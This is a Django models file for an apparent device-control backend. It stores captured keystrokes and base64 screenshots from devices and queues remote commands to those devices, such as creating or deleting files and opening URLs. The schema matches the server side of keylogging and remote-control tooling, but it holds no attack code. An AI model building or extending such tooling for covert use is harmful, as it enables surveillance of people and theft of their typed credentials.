from django.db import models


class CommandType(models.TextChoices):
    MUTE_SOUND = "mute_sound"
    UNMUTE_SOUND = "unmute_sound"
    CREATE_FILE = "create_file"
    DELETE_FILE = "delete_file"
    OPEN_URL = "open_url"


class CommandStatus(models.TextChoices):
    PENDING = "pending"
    EXECUTED = "executed"


# Create your models here.
class Device(models.Model):
    hardware_id = models.CharField("Hardware ID", max_length=255, unique=True)
    name = models.CharField(max_length=255, null=True, blank=True)
    ip = models.CharField(max_length=255, null=True, blank=True)
    os_version = models.CharField(max_length=255, null=True, blank=True)
    app_version = models.CharField(max_length=255, null=True, blank=True)
    last_seen = models.DateTimeField("Last Seen", auto_now=True)
    status = models.CharField(max_length=50, default="offline")
    settings = models.JSONField(default=dict, blank=True, null=True)

    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"{self.name or self.hardware_id} ({self.status})"


class Command(models.Model):
    device = models.ForeignKey(Device, on_delete=models.CASCADE, related_name="commands")
    command_type = models.CharField("Command Type", max_length=100, choices=CommandType.choices)
    value = models.CharField(max_length=255, blank=True, null=True)
    created_at = models.DateTimeField(auto_now_add=True)
    executed_at = models.DateTimeField(blank=True, null=True)
    status = models.CharField(max_length=50, default="pending", choices=CommandStatus.choices)

    def __str__(self):
        return f"{self.device.name or self.device.hardware_id} - {self.command_type} ({self.status})"


class ActivityLog(models.Model):
    device = models.ForeignKey(Device, on_delete=models.CASCADE, related_name="activity_logs")
    key_strokes = models.TextField(blank=True, null=True)
    timestamp = models.DateTimeField(auto_now_add=True)

    class Meta:
        verbose_name = "Activity Log"
        verbose_name_plural = "Activity Logs"

    def __str__(self):
        return (
            f"Log for {self.device.name or self.device.hardware_id} at {self.timestamp.strftime('%Y-%m-%d %H:%M:%S')}"
        )


class Screenshot(models.Model):
    # Read only admin panel
    device = models.ForeignKey(Device, on_delete=models.CASCADE, related_name="screenshots")
    image_data = models.TextField()  # base64 encoded image data
    image = models.ImageField(upload_to="screenshots/", null=True, blank=True)
    timestamp = models.DateTimeField(auto_now_add=True)

    class Meta:
        ordering = ["-timestamp"]

    def __str__(self):
        return f"Screenshot {self.device} - {self.timestamp}"
